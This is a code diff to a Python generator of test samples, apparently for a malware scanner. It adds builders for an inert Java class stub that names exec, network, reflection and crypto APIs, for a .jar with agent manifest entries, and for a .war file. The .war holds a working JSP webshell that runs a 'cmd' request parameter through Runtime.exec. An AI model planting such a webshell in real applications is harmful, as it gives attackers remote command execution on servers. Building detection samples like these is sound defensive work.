@@ -759,8 +759,85 @@ def pyinstaller_exe() -> bytes:
     return pe_stub + pkg
 
 
+def java_class_stub() -> bytes:
+    """A minimal but valid .class whose constant pool references the suspicious
+    APIs (Runtime.exec, URL.openStream, ScriptEngineManager, defineClass,
+    javax.crypto) and a stage URL — enough to fire the Java rules without needing
+    javac at sample time. Inert: it has no methods/bytecode."""
+    pool: list[bytes] = []
+
+    def add(entry: bytes) -> int:
+        pool.append(entry)
+        return len(pool)                       # 1-based constant-pool index
+
+    def utf8(s: str) -> int:
+        b = s.encode()
+        return add(bytes([1]) + struct.pack(">H", len(b)) + b)
+
+    def klass(name: str) -> int:
+        return add(bytes([7]) + struct.pack(">H", utf8(name)))
+
+    def nat(name: str, desc: str) -> int:
+        return add(bytes([12]) + struct.pack(">HH", utf8(name), utf8(desc)))
+
+    def methodref(cls: str, meth: str, desc: str) -> None:
+        ci, ni = klass(cls), nat(meth, desc)
+        add(bytes([10]) + struct.pack(">HH", ci, ni))
+
+    methodref("java/lang/Runtime", "exec", "(Ljava/lang/String;)Ljava/lang/Process;")
+    methodref("java/net/URL", "openStream", "()Ljava/io/InputStream;")
+    methodref("javax/script/ScriptEngineManager", "getEngineByName",
+              "(Ljava/lang/String;)Ljavax/script/ScriptEngine;")
+    for s in (STAGE2_URL, "defineClass", "javax/crypto/Cipher", "java/util/Base64"):
+        utf8(s)
+    this_ci = klass("Shell")
+    obj_ci = klass("java/lang/Object")
+    body = b"".join(pool)
+    header = b"\xca\xfe\xba\xbe" + struct.pack(">HH", 0, 52) + struct.pack(">H", len(pool) + 1) + body
+    tail = struct.pack(">HHHHHHH", 0x21, this_ci, obj_ci, 0, 0, 0, 0)
+    return header + tail
+
+
+def malicious_jar() -> bytes:
+    """An executable .jar: MANIFEST with Main-Class + a Premain-Class (Java agent)
+    and the suspicious Shell.class. Exercises manifest parsing + .class rules."""
+    import io
+    import zipfile
+
+    buf = io.BytesIO()
+    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
+        zf.writestr("META-INF/MANIFEST.MF",
+                    "Manifest-Version: 1.0\r\nCreated-By: 1.8.0_381\r\n"
+                    "Main-Class: Shell\r\nPremain-Class: Shell\r\n\r\n")
+        zf.writestr("Shell.class", java_class_stub())
+    return buf.getvalue()
+
+
+def webshell_war() -> bytes:
+    """A .war with a JSP webshell (request param -> Runtime.exec), a web.xml
+    servlet mapping and a bundled Shell.class. Exercises the JSP rules,
+    web.xml parsing and the nested path."""
+    import io
+    import zipfile
+
+    jsp = ('<%@ page import="java.util.*,java.io.*" %>\n'
+           '<% String c = request.getParameter("cmd");\n'
+           '   if (c != null) { Process p = Runtime.getRuntime().exec(c);\n'
+           '   BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream())); } %>\n')
+    buf = io.BytesIO()
+    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
+        zf.writestr("WEB-INF/web.xml",
+                    '<?xml version="1.0"?>\n<web-app>\n <servlet>\n'
+                    '  <servlet-name>s</servlet-name>\n  <servlet-class>com.example.Shell</servlet-class>\n'
+                    ' </servlet>\n <servlet-mapping>\n  <servlet-name>s</servlet-name>\n'
+                    '  <url-pattern>/admin/*</url-pattern>\n </servlet-mapping>\n</web-app>\n')
+        zf.writestr("cmd.jsp", jsp)
+        zf.writestr("WEB-INF/classes/Shell.class", java_class_stub())
+    return buf.getvalue()
+
+
 def dropper_bundle_zip() -> bytes:
-    """A plain .zip bundling the obfuscated scripts, shortcuts and Python, to
+    """A plain .zip bundling the obfuscated scripts, shortcuts, Python and Java, to
     exercise the nested (recursive) path: each child is parsed on its own."""
     import io
     import zipfile
@@ -778,6 +855,7 @@ def dropper_bundle_zip() -> bytes:
         zf.writestr("instalador.msi", installer_msi())
         zf.writestr("visor.py", dropper_py())
         zf.writestr("visor.pyc", dropper_pyc())
+        zf.writestr("plugin.jar", malicious_jar())
     return buf.getvalue()
 
 
@@ -796,6 +874,7 @@ def build_all() -> dict[str, bytes]:
         "sample_installer.msi": installer_msi(),
         "sample_dropper.py": dropper_py(), "sample_dropper.pyc": dropper_pyc(),
         "sample_pyinstaller.exe": pyinstaller_exe(),
+        "sample_app.jar": malicious_jar(), "sample_webshell.war": webshell_war(),
         "lab/dropper_bundle.zip": dropper_bundle_zip(),
     }
     for ext in X_CT:
